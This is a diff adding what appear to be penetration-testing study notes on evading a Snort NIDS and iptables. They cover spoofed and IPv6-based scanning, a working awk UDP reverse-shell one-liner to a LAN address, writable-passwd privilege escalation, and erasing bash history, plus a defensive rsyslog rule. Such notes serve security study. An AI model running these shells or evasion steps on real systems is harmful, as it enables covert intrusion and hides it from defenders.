@@ -1,0 +1,32 @@
+With the ability to launch a SYN packet, we can spoof an IP on a LAN and then send this to a target which is actively blocking us via IPTables or f2b. This can help us to scan ports which are not open to us due to being blocked by defences. On a NIDS system which may potentially be listening out for any kind of scans. You could spoof an IP for an ICMP scan which would be spoofed, allowing for ARP/NDP discovery of an IPv6 address to proceed onto scanning. 
+
+Setting up snort. 
+https://upcloud.com/community/tutorials/installing-snort-on-centos/
+
+Using SOCKS proxy and port scanning the target you are able to port scan deeper without being visible to the IDS. This could probably help to scan the target further from localhost and using version detection. 
+
+Evading TCP based NIDS, using a UDP shell in Snort.  This will completely evade configs which have all kinds of flags from being detected.
+awk 'BEGIN {s = "/inet/udp/0/192.168.0.70/8080"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+Defences of kernel logging and Snort NIDS to capture any TCP based scans.
+
+How to evade: Use discovery procedure to find the IPv6 address of the machine in order to perform a port scan on all of the enabled ports remaining under the radar from Snort. Proceed onto connecting to the service using the IPv6 address whilst remaining under the radar from the NIDS. To evade capture of any further potential TCP based defences use the AWK UDP reverse shell which can be gained once access is gained from the IPv6 perimeter.
+
+Make vim with sudo and then add a hash in passwd which allows privilege escalation.
+https://steflan-security.com/linux-privilege-escalation-writable-passwd-file/
+
+Anti-forensics. Setting the bash history to dev null so no traces are logged.
+ln -s /dev/null ~/.bash_history
+
+https://stackoverflow.com/questions/22126452/snort-ips-rule-reject-work-but-drop-and-sdrop-dont-work
+https://resources.infosecinstitute.com/topic/snort-network-recon-techniques/
+
+https://forum.netgate.com/topic/121715/snort-ignore-bypass-port-inspection/4
+
+Ignore IPv4 discovery stage as it is not reliable with the use of spoofed IPv4. Make a multicast message of ff02::1 and then port scan for SSH on all discovered fe80 targets.
+
+Install rsyslog onto the server and specify a custom IPTables log file which starts with the log prefix.
+
+Write this in /etc/rsyslog.d/iptables.conf
+   :msg, contains, "<IPT> SSH port:" -/var/log/iptables.log 
+   & ~
